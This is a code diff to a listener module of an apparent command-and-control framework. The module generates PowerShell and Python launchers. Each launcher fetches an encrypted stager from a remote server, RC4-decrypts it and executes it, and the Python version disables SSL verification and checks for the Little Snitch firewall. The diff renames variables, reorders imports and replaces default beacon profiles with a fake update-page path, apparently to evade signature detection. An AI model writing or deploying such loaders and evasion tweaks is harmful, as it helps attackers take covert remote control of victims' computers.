@@ -405,7 +405,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($init+$K))|IEX")
 
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
@@ -419,14 +419,14 @@ class Listener:
             if language.startswith('py'):
                 # Python
 
-                launcherBase = 'import sys;'
+                launcherBase = 'import base64 as b, sys;'
                 if "https" in host:
                     # monkey patch ssl woohooo
-                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+                    launcherBase += "import sys, ssl, os;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
                 try:
                     if safeChecks.lower() == 'true':
-                        launcherBase += "import re, subprocess;"
+                        launcherBase += "import subprocess,re;"
                         launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                         launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                         launcherBase += "out, err = ps.communicate()\n"
@@ -440,7 +440,7 @@ class Listener:
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-                launcherBase += "import urllib2;\n"
+                launcherBase += "import sys, urllib2;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
 
@@ -489,9 +489,9 @@ class Listener:
                 # download the stager and extract the IV
 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
-                launcherBase += "IV=a[0:4];"
+                launcherBase += "init=a[0:4];"
                 launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
+                launcherBase += "key=init+'%s';" % (stagingKey)
 
                 # RC4 decryption
                 launcherBase += "S,j,out=range(256),0,[]\n"
@@ -508,7 +508,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launcher = "echo \"import base64 as b,sys,warnings as w;w.filterwarnings(\'ignore\');exec(b.decodestring('%s'));\" | /usr/bin/env python&" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -672,7 +672,9 @@ class Listener:
             # patch in the delay, jitter, lost limit, and comms profile
             code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            #code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            code = code.replace('$Profile = "/en-us/update.aspx|Mozilla/5.0 () like Gecko"', "$Profile = \"" + str(profile) + "\"")
+
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
             code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
 
@@ -698,7 +700,8 @@ class Listener:
             # patch in the delay, jitter, lost limit, and comms profile
             code = code.replace('delay = 60', 'delay = %s' % (delay))
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+            #code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+            code = code.replace('profile = "/en-us/update.aspx|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36', 'profile = "%s"' % (profile))
             code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
             code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
 
